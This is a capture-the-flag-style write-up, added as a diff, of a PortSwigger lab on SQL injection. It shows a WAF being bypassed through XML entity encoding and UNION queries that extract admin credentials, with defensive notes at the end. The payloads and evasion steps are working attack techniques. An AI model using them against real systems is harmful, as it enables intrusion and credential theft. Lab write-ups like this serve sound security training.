@@ -1,0 +1,136 @@
+# SQL injection with filter bypass via XML encoding
+
+**Category:** Web Exploitation — SQL Injection
+**Difficulty:** Practitioner
+**Progress:** Solved
+
+---
+
+## Description
+
+**Lab URL:** `https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding`
+
+This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.
+
+The database contains a users table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account. 
+
+Hint:
+A web application firewall (WAF) will block requests that contain obvious signs of a SQL injection attack. You'll need to find a way to obfuscate your malicious query to bypass this filter. We recommend using the Hackvertor extension to do this. 
+
+---
+
+## Reconnaissance
+
+- What does the application do? 
+    - Still the same basic shop website, but this time it has a 'check stock'-feature for the products
+- Where is user input accepted? (forms, URL parameters, headers, cookies)
+    - there is no input field (account login is back) but after sending the request to burp repeater it is possible to change the storeId and get a http 400 response, meaning the server has no idea what to do with the request
+- What happens with normal input?
+    - inputting a normal id works as usual and gives back how many units are in stock
+
+---
+
+## Analysis
+
+#### Technology Stack
+
+ - Database:   postgreSQL (see [Fingerprinting](#step-1---fingerprinting-the-database))
+ - Input:      xml
+ - Behavior:   Union-based sqli
+
+
+#### Vulnerability
+
+- What exactly is vulnerable and why?
+    
+As per the lab instructions the 'check stock' feature is vulnerable.
+It sends an xml:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+    <stockCheck>
+        <productId>
+            2
+        </productId>
+        <storeId>
+            1
+        </storeId>
+    </stockCheck>
+```
+and the respons comes back with the amount of units in stock.
+
+My guess is that this xml input is fed to an sql reading the stock from a database.
+Like
+```sql
+Select stock from products where (productID = [productID] AND storeId = [storeID])
+```
+Both IDs are in the xml. Because they are both numeric they are just given to the database as is, without `'`. So no `'` to break out of
+---
+
+## Solution 
+
+### Step 1 - Fingerprinting the database 
+
+First lets check if the WAF is working like the lab says it does:
+```sql
+1`||SELECT'
+```
+return `Attack detected` 
+so encoding is needed.
+The hackvector extension makes encoding easy. For xml just any numeric encoding works:
+
+```sql
+<@dec_entities>
+    1 UNION SELECT version()-- 
+</@dec_entities>
+```
+
+This is funnily enough also the correct version check. The repsonse shows this is indeed a PostgreSQL-Server
+
+
+---
+
+### Step 2 - Enumeration
+
+Quick check to be sure about the amount of columns:
+
+```sql
+1 ORDER BY 1--
+```
+Ann this is the max as well. `ORDER BY 2` returned nothing.
+
+```sql
+1 UNION select 'a'--
+```
+returned the a: 
+
+![a returned](assets/a_returned.png)
+
+so one column is strings indeed.
+
+### Step 3 - Extract / Exploit
+
+Now two quick selects:
+
+```sql
+1 UNION SELECT username FROM users
+1 UNION SELECT password FROM users
+```
+Show that `administrator` has the password `dwes0pm0b10h0n4de26c` and now the lab is done by logging in.
+OH DAMN it is not - the password does not match the administrator so username and password need to be joined together.
+
+```sql
+1 UNION SELECT username || '~' || password FROM users
+```
+This returns the actual login: `administrator~ya1pd3w85jdogmujwwtp` which solves the lab after logging in.
+## Real World Impact
+
+This lab demonstrates that even if a WAF (Web Application Firewall) is used it needs to be set up on-point to stop the attacker from simply encoding the injection which adds next-to-nothing on a difficulty scale. Pattern matching the way WAF does can only do so much. WAF is basically just a type of blocklist and encoding gets rid of it rather easily. SQL-injections are pretty tough to deal with and the best practice against it is to always parameterize the queries.
+---
+
+## Learnings
+
+- numeric parameters do not need a quote breakout the way strings do
+- two seperate queries for usernames and passwords do not guarantee they are in the same order and matching - rather concatenate
+
+
